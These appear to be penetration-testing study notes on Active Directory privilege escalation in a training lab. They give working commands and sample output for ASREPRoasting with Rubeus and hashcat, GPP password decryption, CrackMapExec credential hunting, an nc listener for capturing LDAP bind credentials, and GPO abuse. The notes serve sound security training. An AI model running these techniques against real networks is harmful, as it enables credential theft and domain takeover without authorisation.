> ⚠️ Many of these techniques touch production infrastructure (Exchange, Print Spooler, GPOs, DCs). Some can cause outages or trigger AV/EDR/SIEM alerts. Always scope with the client and document findings even when an attack can't be fully exploited (e.g., uncrackable ASREP hash).

---

## 1. Exchange-Related Group Membership

### What It Is

Default Exchange installs (no split-admin model) grant Exchange extensive AD privileges via groups and ACLs, opening several escalation paths.

| Group                            | Why It Matters                                                                                                                                                             |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Exchange Windows Permissions** | Not a protected group, but members can write a DACL to the domain object → can grant a user DCSync privileges. Often contains stray users/computers.                       |
| **Organization Management**      | Effectively "Domain Admins" of Exchange — full mailbox access + full control of the _Microsoft Exchange Security Groups_ OU (which contains Exchange Windows Permissions). |

- Compromising an Exchange server often leads directly to Domain Admin.
- Dumping memory on an Exchange box frequently yields dozens/hundreds of cached OWA credentials.

### PrivExchange

- Flaw in the Exchange **PushSubscription** feature — any mailbox-holding domain user can force the Exchange server to authenticate to an attacker-controlled host over HTTP.
- Exchange service runs as **SYSTEM** and (pre-2019 CU) has **WriteDacl** on the domain.
- Relay captured auth to **LDAP** → dump NTDS, or relay to another host if LDAP relay isn't possible.
- **Impact:** Domain Admin from any authenticated domain user.

---

## 2. Printer Bug (MS-RPRN)

### What It Is

Flaw in the **Print System Remote Protocol**. Any domain user can call `RpcOpenPrinter` + `RpcRemoteFindFirstPrinterChangeNotificationEx` on the spooler's named pipe to force the server to authenticate to an attacker host over **SMB**.

- Spooler service runs as **SYSTEM**, enabled by default on servers with Desktop Experience.

**Exploitation paths:**

- Relay to LDAP → grant attacker account **DCSync** rights.
- Relay to LDAP → grant **RBCD** on a computer account you control → impersonate any user on the victim host.
- Cross-forest: works against a DC with Unconstrained Delegation in a partner forest, if you already have DC admin in your own forest and the trust allows TGT delegation.

### Checking for the Bug

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

```
ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

---

## 3. MS14-068 (Kerberos PAC Forgery)

### What It Is
Flaw allowing a forged **PAC** (Privilege Attribute Certificate) to be accepted by the KDC as legitimate — lets a standard user present themselves as a Domain Admin.
- Tools: **PyKEK**, **Impacket**
- Only fix: **patching**
- HTB reference box: _Mantis_
---
## 4. Sniffing LDAP Credentials
### What It Is
Apps/printers often store LDAP bind credentials in their admin console (frequently weak/default passwords, sometimes visible in cleartext).
**Technique:** Point the device's "test LDAP connection" feature at your attack host's IP, and stand up a listener on port 389:

```bash
nc -lvnp 389
```

The device will send credentials to you, often in cleartext, when it tests the connection. May require a full mock LDAP server for more advanced targets.

---

## 5. Enumerating DNS Records (adidnsdump)

### What It Is

By default, all authenticated users can list child objects of a DNS zone — but standard LDAP DNS queries don't return everything. **adidnsdump** resolves the full picture, which is useful when hosts have non-descriptive names (e.g., `SRV01934`) and you need to find what they're actually for (e.g., `JENKINS`).

### Basic Dump

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```

```
[-] Connecting to host...
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

### Resolve Hidden Records

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

> Without `-r`, a record like `?,LOGISTICS,?` may show up blank. With `-r`, it resolves to e.g. `A,LOGISTICS,172.16.5.240`.

---

## 6. Other Common Misconfigurations

| Issue                              | Detail                                                                                                                                                                                           | Enumeration                                                                            |
| ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------- |
| **Passwords in Description/Notes** | Admins sometimes store creds in plaintext in user account metadata.                                                                                                                              | `Get-DomainUser * \| Select samaccountname,description \| ?{$_.Description -ne $null}` |
| **PASSWD_NOTREQD flag**            | UAC flag meaning password policy length doesn't apply — doesn't guarantee no password, but worth testing.                                                                                        | `Get-DomainUser -UACFilter PASSWD_NOTREQD \| select samaccountname,useraccountcontrol` |
| **SYSVOL scripts**                 | Batch/VBS/PowerShell logon scripts (world-readable) sometimes hardcode local admin passwords.                                                                                                    | Browse `\\<dc>\SYSVOL\<domain>\scripts`; test reuse with `crackmapexec --local-auth`   |
| **GPP Passwords (cpassword)**      | GPP XML files (drives.xml, services.xml, etc.) store AES-256 "encrypted" passwords — Microsoft published the key (MS14-025, 2014). Patch stopped _new_ GPP passwords, not existing cached files. | `gpp-decrypt <cpassword>`, `Get-GPPPassword.ps1`, CME `gpp_password` module            |
| **Autologon creds (Registry.xml)** | GPO-pushed autologon creds stored in cleartext on SYSVOL — never patched by MS.                                                                                                                  | CME `gpp_autologin` module, `Get-GPPAutologon.ps1`                                     |

### Example — Decrypting a GPP Password

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

```
Password1
```

### Example — CrackMapExec Autologon Hunt

```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

```
[+] Found credentials in .../Registry.xml
Usernames: ['guarddesk']
Passwords: ['ILFreightguardadmin!']
```

> 💡 **Always test recovered creds for reuse** — even old/legacy GPP or SYSVOL passwords frequently work elsewhere in the domain.

---

## 7. ASREPRoasting

### What It Is

Targets accounts with **"Do not require Kerberos pre-authentication"** set. Any user (even unauthenticated, if you know the SAM name) can request that account's AS-REP, which is encrypted with the account's password — crackable offline.

### Step 1 — Enumerate Vulnerable Accounts

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

```
samaccountname     : mmorgan
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

### Step 2 — Retrieve the AS-REP (Windows / Rubeus)

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

> Always include `/nowrap` so the hash isn't column-wrapped.

### Step 2 (alt) — Retrieve via Impacket (Linux, no domain creds needed)

```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

### Step 2 (alt) — Kerbrute (grabs AS-REP automatically during enum)

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

### Step 3 — Crack Offline

```bash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```

```
Recovered........: 1/1 (100.00%) Digests
...:Welcome!00
```

> If you hold **GenericWrite/GenericAll** over an account, you can flip on `DONT_REQ_PREAUTH`, roast it, crack offline, then flip the flag back off. Even an uncracked AS-REP is worth reporting — lower risk, but still a finding.

---

## 8. Group Policy Object (GPO) Abuse

### What It Is
ACL misconfigurations on a GPO can be leveraged for lateral movement, privesc, domain compromise, or persistence — pushed down to every computer/user in the linked OU.
**Possible abuse actions:**
- Grant a user extra rights (SeDebugPrivilege, SeTakeOwnershipPrivilege, SeImpersonatePrivilege)
- Add a local admin to one or more hosts
- Create an immediate scheduled task

### Step 1 — Enumerate GPOs

```powershell
Get-DomainGPO | select displayname
# or, if RSAT GroupPolicy module is installed:
Get-GPO -All | Select DisplayName
```
### Step 2 — Check if Domain Users (or a controlled group) has rights over any GPO
```powershell
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Look for `WriteProperty`, `WriteDacl`, `WriteOwner` in `ActiveDirectoryRights`.
### Step 3 — Resolve GPO GUID → Name
```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

```
DisplayName : Disconnect Idle RDP
Owner       : INLANEFREIGHT\Domain Admins
```

### Step 4 — Confirm Scope in BloodHound
Check the GPO node's **Affected Objects** tab to see which OU(s)/computers it applies to before doing anything.
### Step 5 — Exploit
Use **SharpGPOAbuse** to add a controlled user to local admins, create a malicious scheduled task, or push a malicious startup script.

> ⚠️ **Be careful with scope** — a GPO linked to an OU with 1,000 computers means your "add local admin" action applies to all 1,000. Target specific users/hosts where the tool supports it.

---
## Summary

|Misconfiguration|Auth Required|Typical Impact|Key Tool(s)|
|---|---|---|---|
|**Exchange Windows Permissions / PrivExchange**|Standard domain user (with mailbox)|DA via DCSync|ntlmrelayx|
|**Printer Bug**|Standard domain user|DCSync or RBCD|SpoolSample, ntlmrelayx|
|**MS14-068**|Standard domain user|Forged DA PAC|PyKEK, Impacket|
|**LDAP creds sniffing**|None (network access)|Cleartext creds|netcat listener|
|**adidnsdump**|Standard domain user|Recon / hidden hosts|adidnsdump|
|**Description/GPP/SYSVOL/Autologon passwords**|Standard domain user|Creds, often reusable|PowerView, gpp-decrypt, CrackMapExec|
|**ASREPRoasting**|None (SAM name only)|Offline password crack|Rubeus, GetNPUsers.py, Kerbrute, Hashcat|
|**GPO Abuse**|Depends on ACL grant|Local admin / persistence / lateral movement|PowerView, BloodHound, SharpGPOAbuse|
## Topics for Further Study

- Active Directory Certificate Services (AD CS) attacks
- Kerberos Constrained Delegation
- Kerberos Unconstrained Delegation
- Kerberos Resource-Based Constrained Delegation (RBCD)
- AD Trust attacks